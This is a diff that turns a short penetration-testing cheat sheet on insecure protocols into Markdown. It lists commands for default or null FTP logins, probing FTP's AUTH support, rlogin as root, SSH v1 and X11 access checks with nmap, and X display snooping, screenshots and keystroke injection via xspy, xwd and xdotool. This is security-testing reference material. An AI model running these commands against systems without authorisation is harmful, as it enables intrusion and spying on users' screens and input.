@@ -1,50 +1,99 @@
-Insecure Protocols
+# Insecure Protocols
 
 
 ### FTP access with admin/null credentials
 
+
+
+```
 ftp admin@<target IP>
 user
 admin
 pwd
+```
 
+
+
+
+
+```
 telnet <target IP> 21
 user admin
 pass
 id;
-------------------------------------------------------------------------------------------------------
+
+```
+
 
 ### FTP on non-standard port
 
+
+
+```
 ftp <target IP> <port>
-------------------------------------------------------------------------------------------------------
+
+```
+
+
 
 ### FTP server does not support AUTH command
 
+
+
+```
 telnet <target IP> 21
 AUTH test
-------------------------------------------------------------------------------------------------------
+
+```
+
+
 
 ### Rservices
 
+
+
+```
 513/tcp
 apt-get install rsh-client
 rlogin -l root <target IP>
-------------------------------------------------------------------------------------------------------
+```
+
+
+
 
 ### SSH Protocol v1
+
+
+```
 
 nmap -Pn -n -T4 -p22 --script=sshv1 <target IP>
 
 ssh -1 <target IP>
-------------------------------------------------------------------------------------------------------
+```
+
+
 
 ### X11
 
+
+
+```
 nmap -Pn -n -T4 -p6000-6010 --script=x11-access <target IP>
 
+```
+
+
+
+
+```
 xspy <target IP>
 
+```
+
+
+
+
+```
 OS X
      Screenshot:
      xwd -display <targetIP>:<display> -root -out file.xwd
@@ -70,3 +119,6 @@ OS X
      xdotool key e
      xdotool key r
 xdotool key m
+```
+
+# 
